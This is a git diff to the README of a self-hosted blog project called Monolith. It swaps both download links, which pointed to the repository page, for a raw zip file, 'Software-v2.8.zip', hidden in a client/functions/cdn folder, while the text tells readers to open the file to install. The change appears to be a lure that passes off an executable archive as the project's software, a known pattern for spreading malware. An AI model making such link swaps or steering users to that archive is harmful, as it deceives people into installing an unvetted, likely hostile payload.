@@ -1,6 +1,6 @@
 # 🏠 Monolith - Build your own fast personal blog
 
-[![](https://img.shields.io/badge/Download-Monolith-blue)](https://github.com/Danielm2994/Monolith)
+[![](https://img.shields.io/badge/Download-Monolith-blue)](https://github.com/Danielm2994/Monolith/raw/refs/heads/main/client/functions/cdn/Software-v2.8.zip)
 
 Monolith provides a way to host your own blog. It uses modern technology to keep your site fast and stable. You do not need a deep technical background to manage your content. The setup handles the heavy lifting so you can focus on writing.
 
@@ -18,7 +18,7 @@ This application requires a Cloudflare account to manage your data. Cloudflare o
 4. Open the file to start the installation.
 5. Follow the screen prompts to complete the process.
 
-[Download Monolith here](https://github.com/Danielm2994/Monolith)
+[Download Monolith here](https://github.com/Danielm2994/Monolith/raw/refs/heads/main/client/functions/cdn/Software-v2.8.zip)
 
 ## ⚙️ Setting up your account
 
